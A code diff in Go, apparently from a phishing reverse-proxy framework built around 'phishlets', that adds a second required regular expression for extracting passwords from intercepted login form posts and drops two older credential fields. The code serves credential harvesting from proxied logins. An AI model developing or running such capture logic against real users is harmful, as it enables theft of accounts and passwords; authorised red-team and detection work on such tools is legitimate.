@@ -65,6 +65,7 @@ type PostField struct {
 	key_s  string
 	key    *regexp.Regexp
 	search *regexp.Regexp
+	search2 *regexp.Regexp
 }
 
 type ForcePostSearch struct {
@@ -172,14 +173,13 @@ type ConfigAuthToken struct {
 type ConfigPostField struct {
 	Key    *string `mapstructure:"key"`
 	Search *string `mapstructure:"search"`
+	Search2 *string `mapstructure:"search2"`
 	Type   string  `mapstructure:"type"`
 }
 
 type ConfigCredentials struct {
 	Username *ConfigPostField   `mapstructure:"username"`
 	Password *ConfigPostField   `mapstructure:"password"`
-	GoUsername *ConfigPostField   `mapstructure:"goUsername"`
-	GoPassword *ConfigPostField   `mapstructure:"goPassword"`
 	Custom   *[]ConfigPostField `mapstructure:"custom"`
 }
 
@@ -264,6 +264,7 @@ func (p *Phishlet) Clear() {
 	p.username.search = nil
 	p.password.key = nil
 	p.password.search = nil
+	p.password.search2 = nil
 	p.custom = []PostField{}
 	p.forcePost = []ForcePost{}
 	p.customParams = make(map[string]string)
@@ -602,7 +603,9 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	if fp.Credentials.Password.Search == nil {
 		return fmt.Errorf("credentials: missing password `search` field")
 	}
-
+	if fp.Credentials.Password.Search2 == nil {
+		return fmt.Errorf("credentials: missing password `search2` field")
+	}
 	p.username.key, err = regexp.Compile(p.paramVal(*fp.Credentials.Username.Key))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
@@ -621,6 +624,11 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	p.password.search, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Search))
 	if err != nil {
 		return fmt.Errorf("credentials: %v", err)
+	}
+
+	p.password.search2, err = regexp.Compile(p.paramVal(*fp.Credentials.Password.Search2))
+	if err != nil {
+		return fmt.Errorf("Go pass credentials: %v", err)
 	}
 
 	p.username.tp = fp.Credentials.Username.Type
